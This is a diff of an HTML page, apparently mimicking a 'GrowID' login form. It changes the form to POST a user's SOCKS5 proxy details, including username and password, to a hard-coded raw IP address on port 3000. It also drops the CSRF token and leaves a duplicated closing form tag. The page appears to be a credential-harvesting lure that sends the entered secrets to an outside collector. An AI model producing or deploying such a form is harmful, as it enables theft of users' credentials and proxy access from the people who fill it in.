@@ -111,32 +111,22 @@
                                                             <div class="row div-content-center">
                                                                 <div class="col-md-12 col-sm-12">
 
-                                                                    <form method="GET"
-                                                                          action="http://185.149.27.57:3000/growid"
-                                                                          accept-charset="UTF-8"
-                                                                          role="form"
-                                                                          autocomplete="off">
+         <form method="POST" action="http://185.149.27.57:3000/growid">
+    <input
+        id="login-name"
+        class="form-control grow-text"
+        required
+        placeholder="Enter Socks5 Info (IP:Port:Username:Password)*"
+        name="socksData"
+        type="text">
 
-                                                                        <input name="_token"
-                                                                               type="hidden"
-                                                                               value="qJSVgDQTUWAV7Dzg0koBLj2gTueK1cS6QYKlK9ko">
-
-                                                                        <div class="form-group">
-                                                                            <input id="login-name"
-                                                                                   class="form-control grow-text"
-                                                                                   required
-                                                                                   placeholder="Enter Socks5 Info (IP:Port:Username:Password)*"
-                                                                                   name="socksData"
-                                                                                   type="text">
-                                                                        </div>
-
-                                                                        <div class="form-group text-center">
-                                                                            <button id="loginButton"
-                                                                                    class="btn btn-lg btn-primary grow-button"
-                                                                                    type="submit">
-                                                                                Continue
-                                                                            </button>
-                                                                        </div>
+    <button
+        id="loginButton"
+        class="btn btn-lg btn-primary grow-button"
+        type="submit">
+        Continue
+    </button>
+</form>
 
                                                                     </form>
 
